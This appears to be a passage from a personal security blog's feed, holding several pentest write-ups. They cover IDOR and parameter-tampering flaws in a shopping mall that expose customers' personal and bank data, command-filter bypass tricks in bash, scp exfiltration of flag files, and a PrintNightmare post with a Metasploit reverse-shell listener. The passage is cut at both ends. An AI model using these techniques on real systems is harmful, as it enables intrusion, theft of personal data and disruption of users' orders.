class="headerlink" title="Actual Found"></a>Actual Found</h2><pre class="line-numbers language-none"><code class="language-none">Specific store appearance would say not to put, more sensitive, thank the teacher understanding (don&#39;t try to search what is this mall, thinking of general, only the mall has logged off) since it is market, since have to buy things, most early ideas can may be thinking about for the price or quantity changes, such as a low price to buy other goods, For example, the quantity of goods is changed from 1 to 99 pieces and the price of 1 piece is successfully purchased<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Modify-the-purchase-quantity"><a href="#Modify-the-purchase-quantity" class="headerlink" title="Modify the purchase quantity"></a>Modify the purchase quantity</h3><pre class="line-numbers language-none"><code class="language-none">A product page (red is my code, afraid of someone recognize), can be found to be a wholesale, the number of people is limited to 50-2000, and the normal order is from 50 to start, limit the number is not less than 50:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/1.png"></p><pre class="line-numbers language-none"><code class="language-none">From the point of view of finding a problem, is there a problem if the purchase is successful in quantities below 50?After capturing the order submission packet, the whole shopping mall packet is not encrypted, which is convenient for us to further observe and modify the packet. Here we can find that the goods_num parameter is used to pass the parameter:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/2.png"></p><pre class="line-numbers language-none"><code class="language-none">Release after directly changing to 1:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/3.png"></p><pre class="line-numbers language-none"><code class="language-none">It is found that the quantity on the order check page is also 1, and the price is also the price of 1 piece:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/4.png"></p><pre class="line-numbers language-none"><code class="language-none">There is actually a settlement button in the order check office (screenshot not taken, will be mentioned later). After clicking the settlement button, the packet is truncated, and it is found that the goods_num is 50 again, so there should be layer checkHere, I still change the quantity to 1 and place the order, jump to the cashier, and the price is the price of 1 commodity + freight:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/5.png"></p><pre class="line-numbers language-none"><code class="language-none">Enter the payment module of a payment function, which is also 25.5. There is a qr code of payment below, and I don&#39;t have a screenshot here:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/6.png"></p><pre class="line-numbers language-none"><code class="language-none">Some people might say it&#39;s not very useful to make it smaller, but I also want to make it bigger, but if I look at the goods in the mall, let&#39;s say the inventory is 100, the maximum number of goods is also 100, and it&#39;s almost always the same, but let&#39;s say there&#39;s an event where each person is limited to 5 items and the inventory is 100, Can we modify the actual purchase quantity to collect wool according to the product quantity bypass??<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Get-any-user-order"><a href="#Get-any-user-order" class="headerlink" title="Get any user order"></a>Get any user order</h3><pre class="line-numbers language-none"><code class="language-none">After placing the order, there must be a place to check our order, so I went to the background, looked at the order and started to hate each other, randomly looking for an order in the test process:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/7.png"></p><pre class="line-numbers language-none"><code class="language-none">Direct package change:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/8.png"></p><pre class="line-numbers language-none"><code class="language-none">Easily found a million order data, it must be high risk, here go through, other orders can be obtained in the same way:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/9.png"></p><pre class="line-numbers language-none"><code class="language-none">The above found the order, in fact, there is a lot of data, such as consignee information, name, phone number, address, order amount, company information, name, tax number, address, card number, opening bank and so on......<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Get-the-receiving-information-of-any-user"><a href="#Get-the-receiving-information-of-any-user" class="headerlink" title="Get the receiving information of any user"></a>Get the receiving information of any user</h3><pre class="line-numbers language-none"><code class="language-none">I will not put the specific page of the individual center, more sensitive, first of all confirm the current user receiving address is as follows, you can fill in at will:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/10.png"></p><pre class="line-numbers language-none"><code class="language-none">Look for a product in the merchandise department:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/11.png"></p><pre class="line-numbers language-none"><code class="language-none">The delivery address of the order can be found to be my personal test address:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/12.png"></p><pre class="line-numbers language-none"><code class="language-none">Then enter the settlement function and truncate the packet:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/13.png"></p><pre class="line-numbers language-none"><code class="language-none">The above id is directly changed to any other value:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/14.png"></p><pre class="line-numbers language-none"><code class="language-none">According to the vulnerability explained previously, after placing the order, we actually enter the settlement page. We don&#39;t need to immediately settle on the settlement page, but open another page to enter the personal center. In fact, it can be found that the consignee has become the consignee corresponding to the addressid I modified -- XX Jie:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/15.png"></p><pre class="line-numbers language-none"><code class="language-none">Order details can obtain other people&#39;s detailed harvest data, consignee, contact information, harvest address and so on:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/16.png"></p><h3 id="Cancel-any-user-order"><a href="#Cancel-any-user-order" class="headerlink" title="Cancel any user order"></a>Cancel any user order</h3><pre class="line-numbers language-none"><code class="language-none">This is the real deal, with burpSuite traversing the order number to enable the user to cancel the order. Just imagine, the shopping promotion held by the mall is targeted by malicious people, and normal users place orders. As a result, malicious users keep using the interface of order cancellation to iterate over parameters, and normal users may purchase goods before entering the payment page, the relevant order has been canceled... Will there be a tragic scene of consumer abuse?A User&#39;s personal page, order (ending with 123) Click to cancel the order:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/17.png"></p><pre class="line-numbers language-none"><code class="language-none">Also use the order_id:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/18.png"></p><pre class="line-numbers language-none"><code class="language-none">Given the parameter 995 of the order, click the order cancellation button to replace user B, and change the parameter order_id to 995 of user A:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/19.png"></p><pre class="line-numbers language-none"><code class="language-none">After the data package is released, it returns to user A and confirms that the order (ending with 123) has been cancelled. The following shows that the transaction has been cancelled:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/20.png"></p><h3 id="Get-logistics-data"><a href="#Get-logistics-data" class="headerlink" title="Get logistics data"></a>Get logistics data</h3><pre class="line-numbers language-none"><code class="language-none">As for the order_id parameter, I found that the same parameter was used when I checked the logistics on my personal page, and there was unauthorized access, so I could directly obtain the logistics details of any user&#39;s order, and some order information was intercepted:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/21.png">```</p><pre class="line-numbers language-none"><code class="language-none">Use the id to get more information<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/22.png"></p><h3 id="Product-malicious-brush-praise"><a href="#Product-malicious-brush-praise" class="headerlink" title="Product malicious brush praise"></a>Product malicious brush praise</h3><pre class="line-numbers language-none"><code class="language-none">There is also a &quot;like&quot; function for shopping goods, currently 41:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/23.png"></p><pre class="line-numbers language-none"><code class="language-none">Normally, a single user can only like it once, but I was able to give it a thumbs-up:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/24.png"></p><pre class="line-numbers language-none"><code class="language-none">After clicking the &quot;Like&quot; button, the packet is truncated and the batch replay is successful in a short time:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/25.png"></p><pre class="line-numbers language-none"><code class="language-none">View the product again already 53 likes:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Discovery%20of%20multiple%20logic%20vulnerabilities%20in%20a%20project/26.png"></p><pre class="line-numbers language-none"><code class="language-none">When a customer buys a product, if the customer chooses to push the product according to the number of likes, will the malicious merchant be able to take the top spot? !<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Actual combat record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Logical Vulnerability </tag>
            
            <tag> Discovery Vulnerability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to download remote target file</title>
      <link href="2021/08/29/how-to-download-remote-target-file/"/>
      <url>2021/08/29/how-to-download-remote-target-file/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Please be sure to obey the law. Don<span class="token string">'t download what you shouldn'</span>t download, <span class="token function">watch</span> what you shouldn<span class="token string">'t read, and click what you shouldn'</span>t clickThis is only <span class="token keyword">for</span> technology sharing, <span class="token keyword">do</span> not use <span class="token keyword">for</span> illegal purposes, used <span class="token keyword">for</span> illegal purposes have nothing to <span class="token keyword">do</span> with meSo one of The Times when you're doing a problem, you need to bring something back to the <span class="token builtin class-name">local</span> area, just to get the answer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Tips1"><a href="#Tips1" class="headerlink" title="Tips1"></a>Tips1</h3><pre class="line-numbers language-none"><code class="language-none">Assuming you have the account password of the target machine, you can directly use a third-party SSH tool to access it and retrieve the flag file you want<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Tips2"><a href="#Tips2" class="headerlink" title="Tips2"></a>Tips2</h3><pre class="line-numbers language-none"><code class="language-none">Assuming your target is on a fortress, consider relying directly on the fortress to deliver files<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Tips3"><a href="#Tips3" class="headerlink" title="Tips3"></a>Tips3</h3><pre class="line-numbers language-none"><code class="language-none">Assuming your target has a Web application, consider putting the flag file you will be downloading into a Web directory and remotely accessing it<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="TIps4"><a href="#TIps4" class="headerlink" title="TIps4"></a>TIps4</h3><pre class="line-numbers language-none"><code class="language-none">Assuming that the target machine can open the Web application via Python, etc., and the port is reachable, how will you download it later<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Tips5"><a href="#Tips5" class="headerlink" title="Tips5"></a>Tips5</h3><pre class="line-numbers language-none"><code class="language-none">If none of the above methods succeed, consider using SSH to pass flag files you wantLike this scp 1.7z root@192.168.159.13:&#x2F;tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/How%20to%20download%20remote%20target%20file/1.png"></p><pre class="line-numbers language-none"><code class="language-none">Confirm your target flag file like this <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/How%20to%20download%20remote%20target%20file/2.png"></p><pre class="line-numbers language-none"><code class="language-none">Watch your tracks，you can cat the hosts file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/How%20to%20download%20remote%20target%20file/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bypass </tag>
            
            <tag> Download file </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A few command exec bypass tips</title>
      <link href="2021/08/29/a-few-command-exec-bypass-tips/"/>
      <url>2021/08/29/a-few-command-exec-bypass-tips/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">When executing commands against Linux targets, I found that some commands were somewhat limited, so I read many blogs and shared some command reference learning<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Tips1"><a href="#Tips1" class="headerlink" title="Tips1"></a>Tips1</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">It<span class="token string">'s so simple, I don'</span>t even have to describe it, <span class="token keyword">do</span> I┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment"># a=`id`</span>                                                                                                                                        ┌──<span class="token punctuation">(</span>root💀yangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment"># echo $a</span>用户id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> 组id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> 组<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,141<span class="token punctuation">(</span>kaboxer<span class="token punctuation">)</span>,142<span class="token punctuation">(</span>docker<span class="token punctuation">)</span>                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment"># echo $&#123;a:1,5&#125;</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> 组id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> 组<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,141<span class="token punctuation">(</span>kaboxer<span class="token punctuation">)</span>,142<span class="token punctuation">(</span>docker<span class="token punctuation">)</span>                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment"># echo $&#123;a:1:5&#125;</span>户id<span class="token operator">=</span><span class="token number">0</span>                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment"># echo $&#123;a:1:10&#125;</span>户id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20few%20command%20exec%20bypass%20tips/1.png"></p><h3 id="Tips2"><a href="#Tips2" class="headerlink" title="Tips2"></a>Tips2</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Combine it with an array and <span class="token keyword">do</span> it yourself┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/www<span class="token punctuation">]</span>└─<span class="token comment"># ls</span>html                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/www<span class="token punctuation">]</span>└─<span class="token comment"># b[1]=sudo</span>                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/www<span class="token punctuation">]</span>└─<span class="token comment"># b[2]=touch</span>                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/www<span class="token punctuation">]</span>└─<span class="token comment"># b[3]=yyy.txt</span>                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/www<span class="token punctuation">]</span>└─<span class="token comment"># echo $b</span><span class="token function">sudo</span> <span class="token function">touch</span> yyy.txt                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/www<span class="token punctuation">]</span>└─<span class="token comment"># ls</span>html                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/www<span class="token punctuation">]</span>└─<span class="token comment"># $($b)  </span><span class="token function">ls</span>sudo: 无法解析主机：yangsirrr-github-io: 未知的名称或服务                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/www<span class="token punctuation">]</span>└─<span class="token comment"># </span>                                                                                                                                        ┌──<span class="token punctuation">(</span>rootyangsirrr-github-io<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/www<span class="token punctuation">]</span>└─<span class="token comment"># ls</span>html  yyy.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20few%20command%20exec%20bypass%20tips/2.png"></p><h3 id="Tips3"><a href="#Tips3" class="headerlink" title="Tips3"></a>Tips3</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Cut the existing <span class="token builtin class-name">command</span> to get the space and combine it with the <span class="token builtin class-name">command</span> we want to executeroot@y:~<span class="token comment"># a=`id`</span>root@y:~<span class="token comment"># b=$&#123;a//uid=0(root)/ls&#125;</span>root@y:~<span class="token comment"># c=$&#123;b//gid=0(root)/-la&#125;</span>root@y:~<span class="token comment"># d=$&#123;c//groups=0(root)/&#125;</span>root@y:~<span class="token comment"># $d</span>total <span class="token number">68</span>drwx------  <span class="token number">5</span> root root  <span class="token number">4096</span> Jul  <span class="token number">7</span> <span class="token number">11</span>:02 <span class="token builtin class-name">.</span>drwxr-xr-x <span class="token number">20</span> root root  <span class="token number">4096</span> Jul  <span class="token number">7</span> <span class="token number">10</span>:55 <span class="token punctuation">..</span>-rw-------  <span class="token number">1</span> root root   <span class="token number">349</span> Aug <span class="token number">29</span> <span class="token number">13</span>:57 .bash_history-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">3106</span> Dec  <span class="token number">5</span>  <span class="token number">2019</span> .bashrcdrwx------  <span class="token number">3</span> root root  <span class="token number">4096</span> Sep <span class="token number">14</span>  <span class="token number">2020</span> .cache-rw-r--r--  <span class="token number">1</span> root root <span class="token number">25977</span> May <span class="token number">15</span> <span class="token number">14</span>:12 install.shdrwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Sep <span class="token number">14</span>  <span class="token number">2020</span> .pip-rw-r--r--  <span class="token number">1</span> root root   <span class="token number">161</span> Dec  <span class="token number">5</span>  <span class="token number">2019</span> .profile-rw-r--r--  <span class="token number">1</span> root root   <span class="token number">206</span> Jul  <span class="token number">7</span> <span class="token number">10</span>:27 .pydistutils.cfgdrwx------  <span class="token number">2</span> root root  <span class="token number">4096</span> Sep <span class="token number">14</span>  <span class="token number">2020</span> .ssh-rw-r--r--  <span class="token number">1</span> root root   <span class="token number">169</span> Jul  <span class="token number">7</span> <span class="token number">10</span>:41 .wget-hsts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20few%20command%20exec%20bypass%20tips/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Command execution </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-1675 Windows Privilege Promotion</title>
      <link href="2021/08/20/cve-2021-1675-windows-privilege-promotion/"/>
      <url>2021/08/20/cve-2021-1675-windows-privilege-promotion/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">This vulnerability level belongs to one of the powerful tools for domain opening slightly inferior to zerologon. Compared with the previous relay&#x2F;delegation series of printer protocols, the harm degree and utilization conditions are basically in the same dimensionUtilization condition: a general domain account or machine account permissionAffected version:- Windows Server 2012 R2 (Server Core installation)- Windows Server 2012 R2- Windows Server 2012 (Server Core installation)- Windows Server 2012- Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)- Windows Server 2008 R2 for x64-based Systems Service Pack 1- Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)- Windows Server 2008 for x64-based Systems Service Pack 2- Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)- Windows Server 2008 for 32-bit Systems Service Pack 2- Windows RT 8.1- Windows 8.1 for x64-based systems- Windows 8.1 for 32-bit systems- Windows 7 for x64-based Systems Service Pack 1- Windows 7 for 32-bit Systems Service Pack 1- Windows Server 2016 (Server Core installation)- Windows Server 2016- Windows 10 Version 1607 for x64-based Systems- Windows 10 Version 1607 for 32-bit Systems- Windows 10 for x64-based Systems- Windows 10 for 32-bit Systems- Windows Server, version 20H2 (Server Core Installation)- Windows 10 Version 20H2 for ARM64-based Systems- Windows 10 Version 20H2 for 32-bit Systems- Windows 10 Version 20H2 for x64-based Systems- Windows Server, version 2004 (Server Core installation)- Windows 10 Version 2004 for x64-based Systems- Windows 10 Version 2004 for ARM64-based Systems- Windows 10 Version 2004 for 32-bit Systems- Windows 10 Version 21H1 for 32-bit Systems- Windows 10 Version 21H1 for ARM64-based Systems- Windows 10 Version 21H1 for x64-based Systems- Windows 10 Version 1909 for ARM64-based Systems- Windows 10 Version 1909 for x64-based Systems- Windows 10 Version 1909 for 32-bit Systems- Windows Server 2019 (Server Core installation)- Windows Server 2019- Windows 10 Version 1809 for ARM64-based Systems- Windows 10 Version 1809 for x64-based Systems- Windows 10 Version 1809 for 32-bit Systems<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Vulnerability-detection"><a href="#Vulnerability-detection" class="headerlink" title="Vulnerability detection"></a>Vulnerability detection</h2><pre class="line-numbers language-none"><code class="language-none">Current environment version is windows server 2016 standard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820171447876.png"></p><pre class="line-numbers language-none"><code class="language-none">Confirm that the service starts automatically <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820202734899.png"></p><pre class="line-numbers language-none"><code class="language-none">Use the rpcdump to confirm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1675%20Windows%20Privilege%20promotion/image-20210820170637212.png"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">May be you can using like this:msf6 <span class="token operator">></span> use exploit/multi/handler<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcpmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/x64/shell_reverse_tcp payload <span class="token operator">=</span><span class="token operator">></span> windows/x64/shell_reverse_tcpmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lhost  <span class="token number">192.168</span>.159.13lhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.159.13msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lport  <span class="token number">16666</span>lport <span class="token operator">=</span><span class="token operator">></span> <span class="token number">16666</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> options Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options <span class="token punctuation">(</span>windows/x64/shell_reverse_tcp<span class="token punctuation">)</span>:   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>   LHOST     <span class="token number">192.168</span>.159.13   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>   LPORT     <span class="token number">16666</span>            <span class="token function">yes</span>       The listen portExploit target:   Id  Name   --  ----   <span class="token number">0</span>   Wildcard Targetmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Anonymous-access-configuration"><a href="#Anonymous-access-configuration" class="headerlink" title="Anonymous access configuration"></a>Anonymous access 